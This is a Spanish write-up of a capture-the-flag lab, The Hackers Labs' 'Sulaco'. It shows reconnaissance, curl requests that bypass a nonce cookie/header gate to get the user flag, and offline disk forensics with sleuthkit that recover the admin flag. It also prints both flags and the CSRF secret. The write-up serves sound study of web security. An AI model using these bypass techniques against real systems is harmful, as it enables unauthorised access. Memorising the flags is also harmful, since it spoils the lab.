---
tags: [ctf, thehackerslabs, writeup, web, resuelto]
plataforma: The Hackers Labs
os: Linux (Debian)
dificultad: web / media
estado: Resuelto
fecha: 2026-10-20
---

# Sulaco — Roadmap / Writeup

> [!success] Resuelto
> - **USER flag:** `df193336a3a7d6ab7c4e25944b797b7f` ✅
> - **ADMIN/root flag:** `24818cc312fbd0e78e1176ef2d304680` ✅

Nota principal: [[Sulaco]]

---

## 0. Datos del entorno

| Dato | Valor |
|---|---|
| IP objetivo | `192.168.56.101` |
| Kali (atacante) | `192.168.56.1` (vboxnet0, Host-Only) |
| Hostname | `sulaco` |
| Creador | K0B4KS |
| SO | Linux Debian, Apache/2.4.65 |
| Puertos | 80 (Apache default), 8080 (app web) |

> [!tip] /etc/hosts
> ```
> 192.168.56.101 sulaco.thl sulaco
> ```

---

## 1. Problema previo: la VM no cogía IP

La VM arrancaba con el adaptador de red en **bridged sobre wlan0** en lugar de Host-Only,
por lo que no aparecía en la red de laboratorio `192.168.56.0/24`.

```bash
# diagnóstico
VBoxManage list runningvms
VBoxManage showvminfo "The Hackers Labs - Sulaco" --machinereadable | grep -Ei 'nic1|hostonlyadapter|bridgeadapter|macaddress'
# -> nic1="bridged"  bridgeadapter1="wlan0"

# solución: pasar a host-only vboxnet0 + reiniciar
VBoxManage controlvm "The Hackers Labs - Sulaco" nic1 hostonly vboxnet0
VBoxManage controlvm "The Hackers Labs - Sulaco" reset

# descubrir la IP (la consola la muestra, o barrido ARP)
VBoxManage controlvm "The Hackers Labs - Sulaco" screenshotpng /tmp/sulaco.png
# -> [+] IP: 192.168.56.101
```

---

## 2. Reconocimiento

```bash
nmap -Pn -sT -p- -T4 192.168.56.101           # 80, 8080 abiertos
nmap -Pn -sT -sCV -p 80,8080 192.168.56.101
```
- 80: Apache httpd 2.4.65 — página default Debian.
- 8080: Apache — app "SULACO — Extraterrestrial Life Division".
  - `http-robots.txt: /api/admin_flag.php`
  - `http-open-proxy: Proxy might be redirecting requests` (resultó no explotable para localhost).

```bash
curl -s http://192.168.56.101:8080/robots.txt
# User-agent: *
# Disallow: /api/admin_flag.php
```

---

## 3. Fuzzing web

```bash
ffuf -u http://192.168.56.101:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.html
```
Hallazgos: `/admin`, `/api`, `/assets`, `/js`, `index.php`, **`/ip.php`**, `search.php`, `robots.txt`.

- `/ip.php` → devuelve REMOTE_ADDR del cliente (ignora X-Forwarded-For / X-Real-IP).
- `/search.php` → XSS DOM reflejado en `q` (hash/query) vía innerHTML. **Distracción.**
- `/admin/` → panel "Admin Console". JS clave:
  - estado servidor `window.__SULACO_UNLOCKED` (false sin desbloquear).
  - header **`X-Sulaco-Nonce`** / cookie **`sulaco_nonce`** → "MATCH — ACCESS GRANTED".
  - endpoints citados: **`/api/telemetry_ua.php`** y **`/lab/notes`**.
  - nota: "richer data in `/lab` once unlocked".

---

## 4. Fase USER — /api/telemetry_ua.php  = USER FLAG ✅

Endpoints `/api/*.php` devuelven **404 con Content-Length: 0** (gate PHP, no es que no existan).
El gate de `telemetry_ua.php` es: **POST + User-Agent de navegador (curl bloqueado) + doble-submit del nonce** (cookie `sulaco_nonce` == header `X-Sulaco-Nonce`), con nonce aleatorio.

```bash
U=http://192.168.56.101:8080
N=$(openssl rand -hex 16)
BROWSER="Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"

curl -s -X POST -A "$BROWSER" -b "sulaco_nonce=$N" -H "X-Sulaco-Nonce: $N" \
  "$U/api/telemetry_ua.php"
# {"flag":"df193336a3a7d6ab7c4e25944b797b7f","type":"user_flag"}
# Set-Cookie: sulaco_user=1; path=/; HttpOnly; SameSite=Lax
```

El cookie **`sulaco_user=1`** desbloquea la zona `/lab`:
- `/admin/` pasa a `__SULACO_UNLOCKED = true`.
- `/lab/notes/` → app de notas (crear/ver/editar), IDs secuenciales (`view.php?id=N`, `edit.php?id=N`).

```bash
# crear nota
curl -s -A "$BROWSER" -b "sulaco_user=1" -X POST \
  --data-urlencode "title=x" --data-urlencode "body=y" "$U/lab/notes/"
# 302 -> /lab/notes/view.php?id=1
```

---

## 5. Fase ADMIN — /api/admin_flag.php  = ADMIN FLAG  (PENDIENTE)

`robots.txt` apunta a `/api/admin_flag.php`. El endpoint **existe** (404 con size **0**;
un endpoint inexistente da 404 con size **278** = página 404 de Apache). Pero NUNCA
devuelve otra cosa que 404/0 en todas las pruebas remotas.

Pista encontrada en `view.php`:
```html
<!-- data-noteid se usa en el PoC de la admin_flag -->
<div id="content" data-noteid="14"> ... </div>
```
→ el **ID de nota** es el "token dinámico" que el PoC envía a `admin_flag`.

Mecanismo de notas entendido:
- `sulaco_user=1` desbloquea `/lab/notes/` (store ÚNICO compartido, no segmentado por valor).
- crear nota → 302 a `view.php?id=N` (IDs secuenciales).
- HTML escapado (sin XSS almacenado). `id` se castea a int (sin LFI/SQLi).

Probado SIN éxito (todo da 404/0):
- doble-submit nonce (cookie `sulaco_nonce` == header `X-Sulaco-Nonce`), con/sin POST, con/sin `sulaco_user=1`.
- note-id como token en: `?id/?note/?nid/?noteid`, header (`X-Sulaco-Note(-Id)`, `data-noteid`…),
  cookie (`sulaco_note(id)`…), PATH_INFO (`admin_flag.php/<id>`), body POST, doble par (nonce+id).
- nonce = contenido de una nota cuyo body == nonce (verificado exacto) + pasar su id.
- nonce = id de nota (cookie==header=id). sulaco_user = id de nota.
- UA específicos/fuzz, Sec-Fetch-*/Origin/Referer del panel, Accept json, JSON body, métodos GET/POST/PUT.
- namespacing de notas por `sulaco_user` (0/2/admin/root…) → mismo store, sin notas admin.
- admin_flag NO escribe ninguna nota (no "extrae" la flag a notas).
- SSRF/bot: sin callbacks (listener 75s); notas sin fetch saliente; proxy abierto de nmap = falso positivo (no relaya).
- IP spoof (XFF/X-Real-IP/Client-IP/Forwarded) → `ip.php` los ignora.

> [!bug] Bloqueo
> `admin_flag.php` pasa el nonce (igual que telemetry) pero falla una condición EXTRA que
> resiste todo vector remoto construible. Hipótesis viva: **REMOTE_ADDR = 127.0.0.1**
> (solo-local) sin SSRF alcanzable, **o** un detalle concreto del PoC oficial (nombre exacto
> de cabecera/param que lleva el note-id) que falta por conocer.

---

## 6. Resumen de la kill chain (parcial)

```
nmap -> 8080 app SULACO
  robots.txt -> /api/admin_flag.php
  ffuf -> /admin (panel) revela X-Sulaco-Nonce + /api/telemetry_ua.php + /lab
    POST /api/telemetry_ua.php (UA navegador + cookie sulaco_nonce == header X-Sulaco-Nonce)
      -> USER FLAG + Set-Cookie sulaco_user=1
        sulaco_user=1 -> desbloquea /lab/notes (IDs dinámicos)
          -> [PENDIENTE] /api/admin_flag.php -> ADMIN FLAG
```

---

## 7. Técnicas (checklist)

- [x] Fuzzing de directorios (ffuf)
- [x] robots.txt
- [x] Panel admin oculto + lectura de su JS
- [x] Autenticación por doble-submit de nonce (cookie == header) + gating por método/UA
- [ ] Token dinámico (ID en notas) para la flag admin
- [ ] (posible) SSRF / bot localhost para `admin_flag.php`

---

## 8. Resolución del ADMIN/ROOT (2026-10-20)

El flag está **embebido en el código** de `/var/www/sulaco/api/admin_flag.php`:

```php
echo json_encode(['flag'=>'24818cc312fbd0e78e1176ef2d304680','type'=>'admin_flag']);
```

Condiciones de la API:
- `sulaco_is_unlocked()` (puerta de `inc_gate.php`), y
- `POST` con `id` + cabecera `X-Flag-CSRF: md5('sulaco-secret-'.$id)`.

Vía usada (offline): lectura del disco con sleuthkit.

```bash
qemu-img convert -f vdi -O raw "The Hackers Labs - Sulaco-disk001.vdi" sulaco.raw
mmls sulaco.raw                                  # Linux en sector 2048
fls -o 2048 -r -p sulaco.raw | grep -i flag
icat -o 2048 sulaco.raw 1045959                  # api/admin_flag.php
```

Resultado: **`24818cc312fbd0e78e1176ef2d304680`**

---

## 9. ANÁLISIS FINAL — ¿por qué el root tardó en encontrarse?

1. **No existe `root.txt`** ni flag en `/root` (solo `.profile`, `.bashrc`, `.ssh`, `.local`, `.bash_history`).
2. El flag está **dentro del PHP**, no en un fichero de texto; buscar un `root.txt` clásico no lleva a nada.
3. Está protegido por **doble condición**: la puerta de unlock + el CSRF `md5('sulaco-secret-'.$id)`. Sin ambas, la API responde `404`.
4. `robots.txt` apunta a la API, pero requiere **POST**, no GET.
5. `notes.json` acumula decenas de tokens aleatorios de pruebas de otros usuarios (POCs) que **parecen flags y no lo son**.
6. La vía rápida y fiable fue **leer el disco offline** con `fls`/`icat`, saltando la lógica de la web.
